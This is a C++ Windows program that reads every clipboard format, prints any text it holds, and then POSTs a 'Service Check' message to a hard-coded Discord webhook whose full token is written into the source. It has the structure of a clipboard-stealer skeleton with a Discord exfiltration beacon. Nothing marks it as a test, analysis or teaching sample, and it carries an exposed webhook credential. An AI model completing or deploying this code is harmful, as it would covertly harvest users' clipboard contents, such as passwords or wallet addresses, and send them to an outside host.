#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <curl/curl.h>

// Function to get clipboard formats
std::vector<UINT> GetClipboardFormats() {
    std::vector<UINT> formats;
    UINT format = 0;

    // Get the first available clipboard format
    format = EnumClipboardFormats(0);
    while (format != 0) {
        formats.push_back(format);
        // Get the next available clipboard format
        format = EnumClipboardFormats(format);
    }

    return formats;
}

// Function to get the name of the clipboard format
std::wstring GetClipboardFormatNameW(UINT format) {
    wchar_t formatName[100];
    if (GetClipboardFormatName(format, formatName, sizeof(formatName) / sizeof(wchar_t))) {
        return std::wstring(formatName);
    }
    else {
        // If it's a predefined format, return the format ID as a string
        return std::to_wstring(format);
    }
}

void CaptureClipboardData() {
    // Open the clipboard
    if (!OpenClipboard(NULL)) {
        std::cerr << "Failed to open clipboard." << std::endl;
        return;
    }

    // Get clipboard formats
    std::vector<UINT> formats = GetClipboardFormats();

    // Iterate over formats
    for (UINT format : formats) {
        std::wcout << L"Clipboard Format: " << GetClipboardFormatNameW(format) << std::endl;

        HANDLE hData = GetClipboardData(format);
        if (hData != NULL) {
            // Process the clipboard data based on the format
            if (format == CF_TEXT) {
                char* text = static_cast<char*>(GlobalLock(hData));
                if (text != NULL) {
                    std::cout << "Text Data: " << text << std::endl;
                    GlobalUnlock(hData);
                }
            }
            else if (format == CF_BITMAP) {
                // Handle image data
                // (Add your image handling code here)
                std::cout << "Bitmap Data: (image processing logic needed)" << std::endl;
            }
            // Add other formats as needed
        }
    }

    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Set URL
        curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1299730885184196621/D-thfIMp10tf8vm3GvLpmP13QfaQ-wMnULkCD_IeyXFAdylVMZNaExrUUIEcg9poq3Xf");

        // Specify POST method
        curl_easy_setopt(curl, CURLOPT_POST, 1L);

        // Set POST fields
        std::string jsonData = R"({"content":"Service Check"})";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());

        // Set headers
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Specify the path to the CA bundle file
        curl_easy_setopt(curl, CURLOPT_CAINFO, "lib\\curl-ca-bundle.crt");

        // Perform the request, res will get the return code
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK)
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        else
            std::cout << "POST request sent successfully!" << std::endl;

        // Cleanup
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    // Close the clipboard
    CloseClipboard();
}

int main() {
    CaptureClipboardData();
    return 0;
}
